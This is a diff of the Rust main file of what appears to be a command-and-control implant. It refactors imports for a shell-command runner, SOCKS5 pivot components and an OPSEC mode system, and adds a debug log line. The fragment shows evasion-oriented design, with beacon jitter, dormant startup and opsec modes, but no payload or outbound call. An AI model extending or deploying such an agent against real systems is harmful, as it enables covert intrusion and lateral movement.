@@ -1,31 +1,25 @@
 mod commands;
 mod config;
 mod networking;
+mod opsec;
 
-use commands::command_shell::run_shell;
-use config::AgentConfig;
+use crate::commands::command_shell::run_shell;
+use crate::config::AgentConfig;
 use std::env;
 use std::time::Duration;
 use tokio::time;
 use rand::Rng;
-use log::{info, warn, error};
-use networking::socks5_pivot::Socks5PivotHandler;
+use log::{info, warn, error, debug};
+use crate::networking::socks5_pivot::Socks5PivotHandler;
 use crate::networking::socks5_pivot_server::Socks5PivotServer;
-use crate::opsec::{detect_opsec_level, OpsecLevel};
 use std::sync::Arc;
-use crate::opsec::{determine_agent_mode, AgentMode, OpsecState};
 use once_cell::sync::Lazy;
 use std::sync::Mutex;
-use crate::opsec::{determine_agent_mode, OPSEC_STATE, AgentMode};
-
-static OPSEC_STATE: Lazy<Mutex<OpsecState>> = Lazy::new(|| Mutex::new(OpsecState {
-    mode: AgentMode::FullOpsec,
-    last_transition: std::time::Instant::now(),
-}));
+use crate::opsec::{OpsecLevel, AgentMode, determine_agent_mode, OPSEC_STATE};
 
 fn random_jitter(base: u64, jitter: u64) -> u64 {
-    let mut rng = rand::thread_rng();
-    base + rng.gen_range(0..=jitter)
+    let mut rng = rand::thread_rng(); // (or rand::rng() if using latest rand)
+    base + rng.gen_range(0..=jitter) // (or rng.random_range(0..=jitter))
 }
 
 // Dormant startup function
@@ -104,6 +98,8 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                 info!("[OPSEC] Mode transition: {:?} -> {:?}", state.mode, new_mode);
                 state.mode = new_mode;
                 state.last_transition = std::time::Instant::now();
+            } else {
+                debug!("[OPSEC] Mode unchanged: {:?}", state.mode);
             }
         }
 
